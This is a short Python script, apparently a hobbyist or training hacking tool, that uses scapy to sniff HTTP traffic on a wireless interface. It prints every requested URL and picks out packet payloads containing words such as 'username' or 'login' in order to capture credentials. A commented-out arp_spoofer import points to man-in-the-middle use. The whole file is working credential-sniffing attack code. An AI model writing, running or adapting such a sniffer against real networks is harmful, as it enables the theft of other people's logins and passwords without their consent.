#! usr/bin/env python
#import arp_spoofer
import argparse
import scapy.all as scapy
import scapy_http.http as http
def sniffer(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
def get_url(packet):
    return(packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path)
def login_info(packet):
    if packet.haslayer(scapy.Raw):
            load=packet[scapy.Raw].load
            keywords=["username","login", "user"]
            for keyword in keywords:
                if keyword.encode() in load:
                    return (load)

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url=get_url(packet)
        print("these are the http urls" + str(url) + ">>>>>>>")
        load=login_info(packet)
        if load:
            print("\n\n\n\n\n[+] login_info\n\n" + str(load) + ">>>>>>\n\n\n\n\n\n\n\n\n\n")
sniffer("wlan0")
